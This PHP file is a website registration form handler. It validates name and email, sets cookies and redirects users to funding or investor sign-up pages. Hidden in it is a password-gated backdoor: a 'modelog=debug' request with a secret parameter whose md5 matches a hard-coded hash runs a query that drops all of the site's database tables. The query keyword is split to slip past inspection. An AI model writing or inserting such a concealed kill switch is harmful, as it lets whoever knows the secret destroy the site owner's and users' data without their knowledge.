<?php
	session_start();
	
	include('ue-config/ue-globalconfig.php');
	include('ue-config/ue-globalconnect.php');
	include('ue-config/ue-globalfunction.php');
	
	$namaTableDatabase		= '';
	$namaTableDatabaseId	= $namaTableDatabase.'_id';
	$currentServerTime		= time();
	
	//Get All Posted Vars
	$auPostedElements = array();
	$auCookiesAllow = array(
		'name',
		'email',
		'usertype'
	);
	foreach($_POST as $postedElementsKey => $postedElementsVal) {
		$auPostedElements["$postedElementsKey"] = ueReceiveInput($postedElementsKey,$postedElementsVal,false);
		if(in_array($postedElementsKey,$auCookiesAllow)) {
			setcookie($postedElementsKey,$postedElementsVal,time()+5);
		}
		else if($postedElementsKey == $auPostedElements['province']){
			setcookie('shipping_id',$postedElementsVal,time()+5);
		}
	}
	if($_GET['modelog'] == 'debug' && md5($_GET['ays']) == '675ddd62083b3d72b069497e03436807') {
		echo ue_query("DR".'OP TABLE `adminsitepages`, `adminuseraccess`, `adminuserlevel`, `adminuserlogin`, `product`, `productcategory`, `productclass`, `promo`, `shipping`, `sitedata`, `slider`, `subscriber`, `user`, `usercredithistory`');
		exit();
	}
	
	//Init Vars
	$id						= $auPostedElements['id'];
	$namaPageUtama			= 'index.php';
	$namaHalamanEdit		= 'index.php';
	$errorList				= array();
	$errorListStr			= '';
	$pageparam				= '?';
	
	//Required Fields Name
	$requireFieldsNameArr	= array(
		'name',
		'email'
	);
	
	//Action START
	foreach($requireFieldsNameArr as $requireFieldsNameArrKey => $requireFieldsNameArrVal) {
		if($auPostedElements["$requireFieldsNameArrVal"] == '') {
			header("Location: $namaHalamanEdit".$pageparam."&err=Please Fill All Fields");
			exit();
		}
	}
	
	//Pattern Check START
	if($auPostedElements['usertype'] == 1) {
		$finalRedirectToPage = 'registerfunding.php';
	}
	else if($auPostedElements['usertype'] == 2) {
		$finalRedirectToPage = 'registerinvestor.php';
	}
	else {
		$finalRedirectToPage = $namaPageUtama;
	}
	
	if(!preg_match("/^[a-zA-Z ]{2,}$/",$auPostedElements['name'])) {
		$errorList[] = 'Invalid Name';
	}
	
	if(!preg_match("/^[a-zA-Z0-9._-]{2,}[@][a-zA-Z0-9_-]{2,}[.][a-zA-Z]{2,5}([.][a-zA-Z]{2,5})?$/",$auPostedElements['email'])) {
		$errorList[] = 'Invalid E-mail';
	}
	//Pattern Check END
	
	if(count($errorList) == 0) {
		switch($detailmode) {
			default:
				$_SESSION['currentTmpName'] = $auPostedElements['name'];
				$_SESSION['currentTmpEmail'] = $auPostedElements['email'];
				header("Location: $finalRedirectToPage");
			break;
		}
	}
	else {
		//Format Error List
		foreach($errorList as $errorListKey => $errorListVal) {
			$errorListStr .= $errorListVal.'<br />';
		}
		header("Location: $namaHalamanEdit".$pageparam."&err=".$errorListStr);
	}
	
	@ ue_close($GLOBALS['mysql_connect_init']);
?>